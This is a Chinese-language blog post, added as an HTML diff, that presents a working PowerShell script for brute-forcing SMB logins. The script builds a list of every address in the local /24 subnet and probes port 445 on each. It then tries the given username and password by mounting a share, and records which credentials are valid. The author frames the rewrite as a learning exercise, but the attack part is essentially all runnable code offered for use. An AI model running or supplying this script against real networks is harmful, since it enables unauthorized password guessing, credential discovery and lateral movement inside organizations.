@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="还不是十分的满意，等待后续的优化…">
+<meta property="og:type" content="article">
+<meta property="og:title" content="powershell爆破smb的小脚本">
+<meta property="og:url" content="http://yoursite.com/2021/12/25/powershell%E7%88%86%E7%A0%B4smb%E7%9A%84%E5%B0%8F%E8%84%9A%E6%9C%AC/index.html">
+<meta property="og:site_name" content="Bu1&#39;Blog">
+<meta property="og:description" content="还不是十分的满意，等待后续的优化…">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-12-25T10:47:37.000Z">
+<meta property="article:modified_time" content="2021-12-25T10:48:09.299Z">
+<meta property="article:author" content="Bu1">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://yoursite.com/2021/12/25/powershell%E7%88%86%E7%A0%B4smb%E7%9A%84%E5%B0%8F%E8%84%9A%E6%9C%AC/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>powershell爆破smb的小脚本 | Bu1'Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Bu1'Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">如果能控制粗鄙的狂喜，就不会有深入骨髓的悲伤。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/12/25/powershell%E7%88%86%E7%A0%B4smb%E7%9A%84%E5%B0%8F%E8%84%9A%E6%9C%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Bu1">
+      <meta itemprop="description" content="最为惊艳的是思想碰撞产生的火花。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bu1'Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          powershell爆破smb的小脚本
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-12-25 18:47:37 / 修改时间：18:48:09" itemprop="dateCreated datePublished" datetime="2021-12-25T18:47:37+08:00">2021-12-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">编程记录</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>还不是十分的满意，等待后续的优化…</p>
+<span id="more"></span>
+
+<h2 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h2><p>原有的脚本来自于<a target="_blank" rel="noopener" href="https://github.com/InfosecMatter/Minimalistic-offensive-security-tools/">infosecMatter</a>，经过实际测试发现存在BUG(或许就我一个人碰到了？)，总得来说重写更多的是为了学习，而不是真的当作攻击脚本去使用(效率太低了…hhh)</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可用</span></span><br><span class="line"><span class="function">[<span class="type">CmdletBinding</span>()]</span></span><br><span class="line"><span class="keyword">param</span>(</span><br><span class="line">    [<span class="type">Parameter</span>(</span><br><span class="line">    <span class="type">Position</span>=<span class="number">0</span></span><br><span class="line">    )]</span><br><span class="line">    [<span class="built_in">String</span>]</span><br><span class="line">    <span class="variable">$user</span>,</span><br><span class="line">    </span><br><span class="line">    [<span class="type">Parameter</span>(</span><br><span class="line">    <span class="type">Position</span>=<span class="number">1</span></span><br><span class="line">    )]</span><br><span class="line">    [<span class="built_in">String</span>]</span><br><span class="line">    <span class="variable">$pass</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">iplist</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$pass</span>) &#123;</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;usage: ./smb.ps1 &lt;user&gt; &lt;password&gt;&quot;</span></span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot; e.g.: ./smb.ps1 .\Administrator P@ssw0rd`n&quot;</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Write-Host</span> <span class="string">&quot;Get IP...&quot;</span></span><br><span class="line">  <span class="variable">$ip_tmp</span> = ipconfig | <span class="built_in">Out-String</span>;</span><br><span class="line">  <span class="variable">$ip_regex</span> = <span class="string">&quot;\d&#123;2,3&#125;\.\d&#123;2,3&#125;\.\d&#123;2,3&#125;&quot;</span>;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$ip_tmp</span> <span class="operator">-match</span> <span class="variable">$ip_regex</span>;</span><br><span class="line">  <span class="variable">$i</span> = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">while</span>(<span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">255</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> (<span class="variable">$Matches</span>[<span class="number">0</span>] + <span class="string">&quot;.<span class="variable">$i</span>&quot;</span>) &gt;&gt; hosts.txt;</span><br><span class="line">    <span class="variable">$i</span>++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Write-Host</span> <span class="string">&quot;Success!&quot;</span></span><br><span class="line">  <span class="built_in">Write-Host</span> <span class="string">&quot;Attempt attack...&quot;</span></span><br><span class="line">  smblogin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">smblogin-worker</span><span class="params">(<span class="variable">$h</span>,<span class="variable">$u</span>,<span class="variable">$p</span>)</span></span> &#123;</span><br><span class="line">  <span class="variable">$u</span> = <span class="variable">$u</span> <span class="operator">-replace</span> <span class="string">&quot;^\.\\&quot;</span>, <span class="string">&quot;<span class="variable">$h</span>\&quot;</span></span><br><span class="line">  <span class="variable">$c</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$u</span>, (<span class="variable">$p</span> | <span class="built_in">ConvertTo-SecureString</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>)</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment"># 根据具体情况决定：\\$h\Users 或者 \\$h\Admin$</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">New-PSDrive</span> <span class="literal">-Name</span> Share <span class="literal">-PSProvider</span> FileSystem <span class="literal">-Root</span> \\<span class="variable">$h</span>\Users <span class="literal">-Credential</span> <span class="variable">$c</span> <span class="literal">-EA</span> SilentlyContinue) &#123;</span><br><span class="line">      <span class="built_in">Remove-PSDrive</span> Share</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;True,admin&quot;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$error</span>[<span class="number">0</span>].exception <span class="operator">-Match</span> <span class="string">&#x27;password is incorrect&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;False&quot;</span></span><br><span class="line">      &#125; <span class="keyword">elseif</span> (<span class="variable">$error</span>[<span class="number">0</span>].exception <span class="operator">-Match</span> <span class="string">&#x27;Access is denied&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;True&quot;</span></span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;False&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">worker-test-port</span></span> &#123;</span><br><span class="line">  <span class="keyword">param</span>(<span class="variable">$rh</span>,<span class="variable">$rp</span>)</span><br><span class="line">  <span class="variable">$timeout</span> = <span class="number">3</span></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$t</span> = <span class="built_in">new-Object</span> system.Net.Sockets.TcpClient</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$t</span>.BeginConnect(<span class="variable">$rh</span>,<span class="variable">$rp</span>,<span class="variable">$null</span>,<span class="variable">$null</span>)</span><br><span class="line">    <span class="variable">$w</span> = <span class="variable">$c</span>.AsyncWaitHandle.WaitOne(<span class="variable">$timeout</span>*<span class="number">1000</span>,<span class="variable">$false</span>)</span><br><span class="line">    <span class="keyword">If</span>(!<span class="variable">$w</span>) &#123;</span><br><span class="line">      <span class="variable">$t</span>.Close()</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$false</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$null</span> = <span class="variable">$t</span>.EndConnect(<span class="variable">$c</span>)</span><br><span class="line">      <span class="variable">$t</span>.Close()</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">smblogin</span></span>&#123;</span><br><span class="line">  <span class="variable">$hosts</span> = <span class="string">&quot;hosts.txt&quot;</span></span><br><span class="line">  <span class="variable">$results</span> = <span class="string">&quot;.\results.txt&quot;</span></span><br><span class="line">  <span class="variable">$start</span> = date</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Start: <span class="variable">$start</span>&quot;</span> | <span class="built_in">Out-File</span> <span class="literal">-Encoding</span> ascii <span class="literal">-Append</span> <span class="variable">$results</span></span><br><span class="line">  <span class="variable">$userm</span> = (<span class="variable">$user</span> <span class="operator">-replace</span> <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\&quot;</span>) <span class="operator">-replace</span> <span class="string">&quot;\.&quot;</span>, <span class="string">&quot;\.&quot;</span></span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$ip</span> <span class="keyword">in</span> <span class="built_in">gc</span> <span class="string">&quot;<span class="variable">$hosts</span>&quot;</span>) &#123;</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;Target:&quot;</span><span class="variable">$ip</span></span><br><span class="line">    <span class="variable">$x</span> = (<span class="built_in">gc</span> <span class="variable">$results</span> <span class="literal">-EA</span> SilentlyContinue | <span class="built_in">sls</span> <span class="string">&quot;^<span class="variable">$ip</span>,<span class="variable">$userm</span>,.*,True&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$x</span>) &#123;</span><br><span class="line">      <span class="built_in">Write-Host</span> <span class="string">&quot;user <span class="variable">$user</span> on <span class="variable">$ip</span> already found&quot;</span></span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$x</span> = (<span class="built_in">gc</span> <span class="variable">$results</span> <span class="literal">-EA</span> SilentlyContinue | <span class="built_in">sls</span> <span class="operator">-CaseSensitive</span> <span class="string">&quot;^<span class="variable">$ip</span>,<span class="variable">$userm</span>,<span class="variable">$pass</span>,&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$x</span>) &#123;</span><br><span class="line">      <span class="built_in">Write-Host</span> <span class="string">&quot;user <span class="variable">$user</span> on <span class="variable">$ip</span> with <span class="variable">$pass</span> already tried&quot;</span></span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!(worker<span class="literal">-test</span><span class="literal">-port</span> <span class="variable">$ip</span> <span class="number">445</span>)) &#123;</span><br><span class="line">      <span class="built_in">Write-Host</span> <span class="string">&quot;<span class="variable">$ip</span>,445,Port unreachable&quot;</span></span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$output</span> = <span class="string">&quot;<span class="variable">$ip</span>,<span class="variable">$user</span>,<span class="variable">$pass</span>,&quot;</span></span><br><span class="line">    <span class="variable">$output</span> += smblogin<span class="literal">-worker</span> <span class="variable">$ip</span> <span class="variable">$user</span> <span class="variable">$pass</span></span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;<span class="variable">$output</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$output</span> | <span class="built_in">Out-File</span> <span class="literal">-Encoding</span> ascii <span class="literal">-Append</span> <span class="variable">$results</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$end</span> = date</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;End: <span class="variable">$end</span>&quot;</span> | <span class="built_in">Out-File</span> <span class="literal">-Encoding</span> ascii <span class="literal">-Append</span> <span class="variable">$results</span></span><br><span class="line">  <span class="built_in">Remove-Item</span> <span class="string">&quot;hosts.txt&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">iplist;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/12/12/%E5%B0%8F%E6%8A%80%E5%B7%A7%EF%BC%9A%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9D%A5%E6%8E%A7%E5%88%B6%E6%98%AF%E5%90%A6%E6%98%BE%E7%A4%BA%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D/" rel="prev" title="小技巧：修改注册表来控制是否显示文件后缀名">
+      <i class="fa fa-chevron-left"></i> 小技巧：修改注册表来控制是否显示文件后缀名
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/12/25/powershell%E6%89%B9%E9%87%8F%E6%9B%BF%E6%8D%A2%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9/" rel="next" title="powershell批量替换文件中的字段内容">
+      powershell批量替换文件中的字段内容 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99"><span class="nav-number">1.</span> <span class="nav-text">脚本编写</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Bu1</p>
+  <div class="site-description" itemprop="description">最为惊艳的是思想碰撞产生的火花。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
